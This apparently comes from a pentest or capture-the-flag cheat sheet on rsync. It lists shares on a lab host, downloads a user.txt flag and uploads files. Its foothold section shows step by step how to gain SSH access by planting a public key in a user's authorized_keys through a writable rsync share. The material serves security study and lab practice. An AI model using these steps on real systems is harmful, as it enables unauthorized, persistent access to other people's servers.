
---

## Connecting (authenticated)

```
rsync rsync://rsync-connect@10.114.170.81                                
files           Necessary home interaction
```

```
rsync rsync://rsync-connect@10.114.170.81/files
Password: 
drwxr-xr-x          4,096 2026/05/02 14:12:15 .
drwxr-xr-x          4,096 2025/06/28 11:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 06:49:29 sys-internal
drwxr-xr-x          4,096 2026/05/02 14:12:16 ubuntu
```
## Downloading Files (authenticated)

```
rsync rsync://rsync-connect@10.114.170.81/files/sys-internal/user.txt .
Password:
```
## Uploading Files

```
rsync -av test.txt rsync://rsync-connect@10.114.170.81/files/sys-internal 
Password: 
sending incremental file list
test.txt

sent 100 bytes  received 35 bytes  20.77 bytes/sec
total size is 0  speedup is 0.00
```
## Foothold

When there is an .ssh directory within an user share, we can upload an public key into authorized_keys and get SSH.

1. Generating SSH Keys.

```
ssh-keygen -o
```

2. Uploading public key into authorized_keys.

```
rsync -av id_rsa_temp.pub rsync://rsync-connect@10.114.170.81/files/sys-internal/.ssh/authorized_keys
Password: 
sending incremental file list
id_rsa_temp.pub

sent 202 bytes  received 35 bytes  22.57 bytes/sec
total size is 91  speedup is 0.38
```

3. Connecting to Server with private key.

```
ssh -i id_rsa_temp sys-internal@10.114.170.81
```
